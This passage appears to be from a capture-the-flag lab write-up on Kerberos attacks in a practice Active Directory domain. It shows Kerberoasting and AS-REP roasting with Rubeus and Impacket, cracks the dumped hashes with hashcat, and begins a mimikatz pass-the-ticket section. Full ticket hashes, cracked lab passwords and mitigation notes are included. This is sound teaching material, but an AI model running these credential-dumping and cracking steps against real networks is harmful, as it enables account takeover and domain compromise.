                             B99BAF61ACB5C00D557DED51192C1EE0094910B63A6CCCB4E9A0D60810AC6C673B5CCF9B17B1441E
                             8C27448718EE9DBCF8AE3171F97894E010AD9B16DC5DF5F41F492238FEEA0924364835FC20660926
                             5B461949A5033E520B45E963B636BE8C36D948FDFDEFA46EEF53D181027FC96410C0AA7729AA48FF
                             199AB864A3845CEA32568B815A39BF9CE54A3DD005C1843085E68366282F5515C5880514ED777239
                             82E0C9F4F94FA8FFE57BC70EFEE3475D5A2945B1EC38953889D7D05BD4BC2D5D0145F5D4306FB7AA
                             C31A4200A05E1FDAE382E442277AA3687998C9AF81825C2369A01235D6A377AB805D7125D10C5127
                             3D2A9DBDFFEE5C413D04B0A1E951CA5816BBD931D88381AB8E24F63C0858392C87832AA95FA6A8D3
                             A62B82869A4F4265ED7734D68E6A07297F3DB5664B60414EC884CCA48C8E9BAD6BB862FE660539A2
                             467CF241E7A4482025B65493B4DD546B1327DCD3937BD0EEDF00E8C3E106C48C8D5B1A5D399F0A15 
                             68145A7F5B610348473698FC557098BBB501F593D628B021BD80F480E2BC012573C7A3AB61E625EA
                             0D9A0D7AC1F33178D9E1851F924EA72108478CE21076BEF655C3756888CE08409DC29472B7ADCE60
                             97540C361D1FD15EA4AC4741F7FC5B35AE12AE83377AF76E96E2885551


[*] SamAccountName         : HTTPService
[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
[*] PwdLastSet             : 5/25/2020 10:39:17 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo
                             cal:30222*$1107C60238BC2C0ADB7B4F332ADA285C$225587003579F5A3F1084BCB2E1BC93AFF2A
                             0D1B8176EE4824AE8D943B4A165E688B737ED1C43D0D684802906E01E9B9775CFA3743CCB856F185
                             FF26F88C945597C667EA25F07AF04FC18FF4EB01592A4A24BF04C5BA63A9AB7AB269AE5F9EE4E694
                             9C45BB22F169E1F426F10D3BED76F18C0799882ED4645C943212A3E8BB965152134896237D8AE43E
                             BBF3A86BD4549B53EC028FA1A99C770522D78077AF19DE212592BE2BA9225E6C7B95A4D23C1B58C9
                             B2ADA9FAD258085D3D83B21C032D70E7E083484BC10A8E934C318061AED670A173FC412E82472423
                             8C1E59ACC1612B08206A7E3DF62DDAFA07AB5AD4EEA3F3640164DD6F8CFE6DD74177471D591284B4
                             05F805AE3C862E3C08040C8B3545C0B84895BFA3AAE2ED1121FDB605389F26A5D5A3953569250FD0
                             48B39F94BCBB86A99837B070442FA46DC18F2C840D7E889BD48CCB854A6667BCDCE8CA9088FA2DA8
                             3EE9168F0D66CAA3F9F84442359F0F1172663C11C6E40D30CA04CA37B033E0EA85EFCBC1D71738C1
                             5057F9F298ABAC58AA76245605A0545ACAE7B250F21047AD7BF0C7F7EF5093130330AFFB92B4347A
                             2892CEA4B18FF1B4E37CE0D5D91703AF9517AB337AAFEC13C77CDD63C13300108F0A529CD6BD05FB
                             39D8F61A1B9E9626E013CF4F09623B6B7E70C53ADFE801A5D977A6123D3ECB5BD3D397E12B535C71
                             6BEDCD38390EB69BA40354100F907A82177FAEF08D738B26EF72600D974BCB47F21C5DEE06D3574D
                             2ECA047E5E9CEBEEBB88612A163F2CE410839DED4BE491A2C9C1D3BD4CCDED81A0906CAE2A0C68D2
                             9F9107C4CE0305A8D4350713EADB0FDB81371B3F0F260C5DC5333B0D13F645B357F15198F962018A
                             D911BB817AE0500FFCD24C8B9C1AA869051AA1DAB55924B6AB8A7F32B4E781E95836A9C38CB85883
                             04BAC18F033800031091DCE08C70B3FB9100DBAE4D15FD00B096C007D0112DDA7413C2C5C5C297EF
                             9CBDD5A221802535F220548ABB9906F4FAE720B396811F5E029211E9D0C505C461B554AB43AC4EF5
                             E57B73876E2C1217F575F6B8B3664ED4729695BA66E23361C923ED7F465DEADF400DC1F3081F11AE
                             807C068B80EA09F3B1DE123105664764B35779F5BC3A3192E9C80D14BA79A60E5A13BCE06CBEEA77
                             F1FFB058BD391A7A95CAE2763FE6693900EEDBEED6D45433D8DF294D64A6422BF26BE49898A5AC01
                             782FC378E263C2A2504BACB34EC1B2DA20084AA35B39DD80C02DC5E064711863C11D2D0BE75D34CE
                             B3196A75CCB6BFD8DF93698BC0B1FC3323F1B5979CA60EEF715855B07A96EA459C828C06669DE234
                             BEB206BC54B2BC8B960A2748BDF8E1FAAE5E4E3F4025F20F3BACD0185D239C0ACA8A0F68CACE1288
                             54353B9B170D6D17BE536B4E57FA0AFBC2A6BEFA450ED73A98EFE0BCDA7DCCB02E44A35F0CD6B62A
                             73C37F5C78140D6038E1EC63118659FFDCE1F95AC3DC6188D42EAE332888711E0CABAB75DA40575C
                             7A2DECE3A273BF164A5659D02252E836D7E4E934BF81F339CDB2D6EFC011E659ED7FA63DAFF94962
                             CFE0CDAD7DBFDC099E8159C4B8B98D950E9D85023727D1C587B7EFDDF201A0CDA17080379A422F42
                             4C71565D11C13309C7AFB52C6D42EF58A3F2BD339B512143AC664EA84B0B

```


Copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat
```
$ hashcat -m 13100 -a 0 hash.txt Pass.txt
```

#### 2. With Impacket

```
$ sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.242.205 -request
```
this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

```
sudo python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.245.162 -request
[sudo] password for kali: 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName                             Name         MemberOf                                                         PasswordLastSet             LastLogon                   Delegation 
-----------------------------------------------  -----------  ---------------------------------------------------------------  --------------------------  --------------------------  ----------
CONTROLLER-1/SQLService.CONTROLLER.local:30111   SQLService   CN=Group Policy Creator Owners,OU=Groups,DC=CONTROLLER,DC=local  2020-05-26 03:58:26.922527  2020-05-26 04:16:42.467441             
CONTROLLER-1/HTTPService.CONTROLLER.local:30222  HTTPService                                                                   2020-05-26 04:09:17.578393  2020-05-26 04:10:14.671872             



$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$63de61dfaf351c0386d7055044b0b525$304adf22e35f10a2e2abd8cffc4a5a685d16498af876ee5552274359fa0128fad8300fcd161a1dda20604bb124b33534798120c4ce0dc4930ee9783316be5960b1ba31c8a5aab42f777e083ff7d67bc403cd0f0cd1234a6372d5fb86b280d3826a2e41d7020786b9feac0b8c91ac1c4146bb92accf84a3d20c43fdf54ba46a4dde0bab2c606d8c3c9823d3f35b88db18f2c70e838c4bb6b0eba02f15c27f126561ad863eb1545821d501f0078a73694a38ddf4342838e6c3a64e7de21c1e7180552979f804bfeb1cfe9a40a4c7d21db5aeed9bf26cf1e0bc0bd2bd0d9ae55b00ea455326dd1175e2688b3f1de2ffaf85b9e46a7838fed782a24ff97c566e7a80196ef1bd88d7f567bc7506c6773156cadc95a38c52a4592022abd4cd7454a0698cc211c7eda3a273d087fd4ce6b86d57bba5189436917a2fc5a4ca206d7a8ee7d6dc62c594159b511c0ec4b6b097d6dbe539781a6c0075f82c6e44c14b06ed4a4a00ea8334c6e2d598abbd140b868241c74a4bee758f1f0cdc527c88e98ac56db3965b8d3acab1f925db3ea5c3cba8b8d03d641540cbe477a086fac27ffbffab141e3411817c0ba92e142ae223ebf6f5c77e5492ab2952fafce43055eb855b922e0458e840e6ce37aff6470a7454f35c1d1f098a1f28ac9ea1420a2e9d087445d67b02de22c99cf1621315771c331ab31f00383ce3fb0a87a25971c4515d4b50a8c0202fce1e50d1248b1f1263e271ffba71eebdba6212e67e0ebd8ac08527853f34dc90af34ecba94c32d0c048009244dd275a5c5cbf8cd3002b86940113dd7e8d29c1147f23df3d987b25cfc33cf24d880b17e0a747919801d82a0f4e628a828caafa6072b9fb27a8ac63412302965b73e780861787a9c22fce034cd14de971ce5b884c676a752be490199e8d314d7da3c6f41234e12285bd9bc549a281f02b5fe385d05052f9a16b7e2b1432b8107a9ddd4d12b0b1374ca5e2ebc19ba85296589335b650f37628b0a013a8d89a6d9fd69304ba3488a9c357f22430d6d19cb09cc2578426cc406dc475e157deb0de7ee3190c2533ffaf6738f93cc43f6004cbb820388ddbc65e1b6303f856a6533d2fbf4014fba4c924516c6b87032d9ef902415fe303c30ce6a0df8722447b3a068c74a9e7d488e30728a4ca281b16fe02cf94798be5758c2e37f3f46807b07d136e27c5f3b5e3523cfc038c854be00e42560ee3dabd6746ea8f24073b795dca1a1e9ab1b6a79da3d06b18f3281649ba3b3a215e84e28b93d99911acd5d31d2950add7215382682141fb4aa230a1f688d89e9b1b40f2aa20b834e7640a4b86d88961a69ac7ff9afdbb124f64d18ed2320bb4b8a9fede3d7064aacc9bc82d38fa53d5d
$krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService*$64a7d4609396c47f9c80d80182c15c76$5b122633500f436cec4d0303861a9fa59ca0540cec4542b148951b4d221272ef6adbc44c4d48cebe3909806fddacdb43057919d0b470a248a5f855df94a382ce5468d820c0dfc76d4f3ec44b61d1b44b6731215770ad3d46819af1d659168aa1b679e58d3e3f0682d8fe98fc0a687fdef5077e34f0ea4299485ec3a9778182727af2f4c2c816182eadcfe03e34f32f472685d48d1dccc82a24ebbcd1e0f88287084bb87db097af4681e7df04a123042d45a8ebded5ed0331c6fc41fc08ddf961040c292b6877ca9a9e1e3c5a13558dafc346cc4288236a9a63126f0ec60c1ad5bf654c0fd0dd8793ae549101c89073c43dd54d39effcee182dbd30e48e5294f0caa314867f3b025987d42110d0caf18d514dd7a551e02b5f1e940545f1e66afade5237b4c368e33e51e72aff6f960d0f8f16677fa7ddbe5492cd17d879cdff66c5ea2de39bd1f24546a163683be69a8f9639cdacef3f04133bc7fcb4536a26565c05d8fb99ff7445ad1b14d1f999bd1992d6d65315f4f2760fc76a6b2801b5b966a4373758b18a5875b2310494af133f810e389e5e0f078a3e1cff3f377446a14f83715123632d1f795cb3a01fb0fa3885d3543f891b42cf0947919301618e2f9eed557d6f6341c2a58a78be957f5d5bb7d243e3eeee62a83361d8377ed290a7ae977f22a3d4471836f3ec0b851d04f10baa7184873395feaca39d5493edc1e094f3cc3df188118734835ad70aa5c7c806760c3ba16785498b4636cbb494ef74a6701ce0933851f912652733722a09d3d8a6989475ab149a43cd2e38e81f89104257ba3f362357ee81785775060bdcf7e3d2d843a8ab91a57a892b19edbb57ddb120674b0ef0ce3acc30e84849fcff29be63e9883111fa43848c98f902df0e65d851dc5395b611f9daaabb6dea1e74e14d5a55223102a81bd15b6831b8a19116a2d7f7c22d1edebba058d9b68d6b2640c1e6b55a5c462931a4dcd600b4976779ae40501d0bd44c46697e530eee32b09562111c20e68cd391203fec0f5794851315c33a449da6f234a7a04b0af18904c9663b8c74b8de2628b6ce84880eecd30fe7c84cad65d5c28a8982659cd1b54d6d701e421331374c004f49f94465937f5a292044aef0c3d6827e2776141e54f2ac1a31da8f02556071d4429a9a7d31ed4f4e49de34456a10f633d932c97b82cd13b011da77d95fbf6c67fa991106024f49aa0af5163fe8b3cc66265840db6660a9656eac963e2709f669b42979ca4d6bef3e3b83aa3e48a2fa0812c1060f483b91d9321418aff08016709f58a3b144f003a689ce32c95ba639ac1c12bdee98549ecc3cb26519ce02152869c814b2e852861d52210103817237e65a0c9b6bbe7bac7f
```


Now hash crick with hashcat
```
$ hashcat -m 13100 -a 0 hash.txt Pass.txt
```

All same as done in Attacktive Directory THM Room

----
### NOTE:
Both, Rubeus and Impacket does the same thing.
Only the difference is:
1. Rubeus need to be present in the trgt machine
2. Impacket can be used from attacker machine (remotely), but it needs _one credential_.
----

#### What Can a Service Account do?

After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users. If you are in a professional pen test be aware of how the company wants you to show risk most of the time they don't want you to exfiltrate data and will set a goal or process for you to get in order to show risk inside of the assessment.


#### Kerberoasting Mitigation

- Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective

-  Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins. `=>` Straight cut, ***domain user accounts*** will **not** be _kerberoastable_


1. What is the HTTPService Password?

`Summer2020`

2. What is the SQLService Password?

`MYPassword123#`


#### Task 5  AS-REP Roasting w/ Rubeus

Very similar to Kerberoasting, **AS-REP Roasting** dumps the _krbasrep5 hashes_ of <ins>user accounts</ins> that have ***Kerberos pre-authentication disabled***. Basically captures the hash of that part of the AS-REP response which is actually encrypted by <ins>user's password hash</ins>.

Main Criteria to perform AS-REP Roasting:

1. Unlike Kerberoasting these users do not have to be ***service accounts***.
2. Only requirement to be able to AS-REP roast a user is the ***user must have pre-authentication disabled***.

#### Dumping KRBASREP5 Hashes w/ Rubeus

```
> Rubeus.exe asreproast
```
```
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe asreproast

   ______        _                       
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___  
  |  __  /| | | |  _ \| ___ | | | |/___) 
  | |  \ \| |_| | |_) ) ____| |_| |___ | 
  |_|   |_|____/|____/|_____)____/(___/  
                                         
  v1.5.0                                 


[*] Action: AS-REP roasting 

[*] Target Domain          : CONTROLLER.local                                                               
                                                                                                            
[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users 
[*] SamAccountName         : Admin2
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::492e:b308:d13a:31c4%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$Admin2@CONTROLLER.local:2418E7A2CCFB59AC20496AFA443FAD2C$C7F8E17C8207
      25E5F870EB4BF344EC25D3D71A4E0C9B891B3F678005ACD11CF04F9344FAB13C2F38805FF1C0B66F
      48E6BC385A85FE0550BFC4CA7D34AB9421FC5FF4FC32AC634E2325FB1D7B44D82611C4E4F9C328BE
      BB46D92FC7FA4C28E3136E111F5480A4D84DB2A0CDF97675B9E99DB0241713F24408261DDB850F3E
      C82816150B741606D33306597E301013DF0B4BD9BBEC6229D504497CBCFCF6A37948644B90BC08E2
      3EDE85AFCC1BFAB57CCEFBCE54FEE274D6E31494C2D79E2154433FABB68AD17E7337D7D696B43577
      E26DF15B1014C41025B7A17DA96A9E0B17224037A8B810989C87784DA124BF86A97E49AC585D

[*] SamAccountName         : User3
[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::492e:b308:d13a:31c4%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$User3@CONTROLLER.local:36E0504E29C9C5D691787B7CF326E5DC$ED2A34E66D710
      8DC3125B204A8B60BCEEE45FE007066A85BC6FAF48789DEC756B224344B9844C6BB32999364E99B7
      4A9332D5FFE084A8C4B9B98F206B2ED8E31FAB900B6BC59385D3717BEE3BE4516EE8A17CA4EC9FCA
      9AFACD159AE1B847EA7B76886FCF683CD448B2B162B92260B176DD4109F7A208C96ABAE0871010E2
      D66C51D908194FFBFB3EB7D193F9D628E83FD78F2414EC1B571F17985F0D5932E8B7E088000DB4CC
      2068442E13E08AD6FDB1341C41528D86A37694FAD8F7F5E5F30AE67E48E7A0A43AEFE4D9E7934D1C
      AAC333211BF62DFD5CFB60FF625B7D58E51244C52DC22B7A955C61411578531E38B32E7C209

```
#### Using Get-NPUsers:

But in this, we actually have to know the user name:

```
> impacket-GetNPUsers controller.local/User3 -dc-ip=10.10.171.139
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Cannot authenticate User3, getting its TGT
$krb5asrep$23$User3@CONTROLLER.LOCAL:cb9f526ce4eac9de244129e2efc05091$18baf7b946a112fc41d22fe4aaa652a9f2742e542e3c60cc44f6482ee89262a8176b03edaef291ed7e697ba0e3e717c948e4d9fe5f3e2e5ba02a0339b3dfa0438d31518b7c0b9a2f40caff877937716cd5d9ac29cf1203d574c3289cd5855a847399562719e495c01e51f67650a087ca155377090786f4bd8d5f77c2de50c9cb34870fc3f4d9fc65c4795be669abeac15ea2d584ba05704e43a058a7936eeb57ef10e0855f0de6653172450f3518fdc9708583c57b9ac67a5dab112220ee5dd6733864248b14588494cf0538de944ec1d4c1faf7bddf51321abe5e582fc2e65f56f342f217ff4d6afaa56987f145330f76b5af73
```
And in this case, we don't have to add `23$` at the back of `$krb5asrep$`


#### Crack those Hashes w/ hashcat

`Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....`

NOTE: "This is done to match with hashcat's format"

```
$ hashcat -m 18200 Admin2_hash_asreproast Pass.txt

hashcat (v6.1.1) starting...

	----snip----

$krb5asrep$23$Admin2@CONTROLLER.local:2418e7a2ccfb59ac20496afa443fad2c$c7f8e17c820725e5f870eb4bf344ec25d3d71a4e0c9b891b3f678005acd11cf04f9344fab13c2f38805ff1c0b66f48e6bc385a85fe0550bfc4ca7d34ab9421fc5ff4fc32ac634e2325fb1d7b44d82611c4e4f9c328bebb46d92fc7fa4c28e3136e111f5480a4d84db2a0cdf97675b9e99db0241713f24408261ddb850f3ec82816150b741606d33306597e301013df0b4bd9bbec6229d504497cbcfcf6a37948644b90bc08e23ede85afcc1bfab57ccefbce54fee274d6e31494c2d79e2154433fabb68ad17e7337d7d696b43577e26df15b1014c41025b7a17da96a9e0b17224037a8b810989c87784da124bf86a97e49ac585d:P@$$W0rd2

```
```
$ hashcat -m 18200 User3_hash_asreproast Pass.txt

hashcat (v6.1.1) starting...

	--- snip ---

$krb5asrep$23$User3@CONTROLLER.local:36e0504e29c9c5d691787b7cf326e5dc$ed2a34e66d7108dc3125b204a8b60bceee45fe007066a85bc6faf48789dec756b224344b9844c6bb32999364e99b74a9332d5ffe084a8c4b9b98f206b2ed8e31fab900b6bc59385d3717bee3be4516ee8a17ca4ec9fca9afacd159ae1b847ea7b76886fcf683cd448b2b162b92260b176dd4109f7a208c96abae0871010e2d66c51d908194ffbfb3eb7d193f9d628e83fd78f2414ec1b571f17985f0d5932e8b7e088000db4cc2068442e13e08ad6fdb1341c41528d86a37694fad8f7f5e5f30ae67e48e7a0a43aefe4d9e7934d1caac333211bf62dfd5cfb60ff625b7d58e51244c52dc22b7a955c61411578531e38b32e7c209:Password3

```

1. What hash type does AS-REP Roasting use?

`Kerberos 5, etype 23, AS-REP`

2. Which User is vulnerable to AS-REP Roasting?

`User3`

3. What is the User's Password?

`Password3`

4. Which Admin is vulnerable to AS-REP Roasting?

`Admin2`

5. What is the Admin's Password?

`P@$$W0rd2`


#### AS-REP Roasting Mitigations

- Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective
- Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.


#### Task 6  Pass the Ticket w/ mimikatz

Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however we'll be using mimikatz in order to dump a TGT from LSASS (Local Security Authority Subsystem Service) memory.

LSASS - see: [LSASS blog](https://www.deepinstinct.com/2021/01/24/lsass-memory-dumps-are-stealthier-than-ever-before/)

This will only be an overview of how the pass the ticket attacks work as THM does not currently support networks but I challenge you to configure this on your own network.

You can run this attack on the given machine however you will be escalating from a domain admin to a domain admin because of the way the domain controller is set up.


#### Pass the Ticket Overview

Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.

![](Pass_the_ticket.png?raw=true)

#### Prepare Mimikatz & Dump Tickets

You will need to run the command prompt as an administrator: use the same credentials as you did to get into the machine. If you don't have an elevated command prompt mimikatz will not work properly.


